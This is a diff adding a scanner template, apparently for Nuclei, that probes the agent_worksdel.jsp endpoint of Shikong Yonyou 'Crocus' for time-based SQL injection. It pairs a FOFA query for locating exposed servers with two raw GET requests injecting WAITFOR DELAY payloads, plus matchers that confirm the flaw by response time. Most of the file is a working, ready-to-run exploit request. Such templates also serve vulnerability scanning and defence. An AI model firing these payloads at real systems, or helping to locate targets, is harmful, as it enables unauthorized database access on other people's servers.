@@ -1,0 +1,29 @@
+id: shikong-yonyou-agent_worksdel-sql-injection
+info:
+  name: 时空用友 agent_worksdel 接口 SQL 注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: product="Crocus" || (body="/ThirdResource/respond/respond.min.js" && title="Crocus")
+    该接口存在未经验证的用户输入处理逻辑，攻击者可通过构造恶意SQL语句实现数据库敏感信息的非法获取与操作。
+  tags: 时空用友
+http:
+- raw:
+  - |
+    GET /worksheet/agent_worksdel.jsp?id=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+  - |
+    GET /worksheet/agent_worksdel.jsp?id=1%27;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
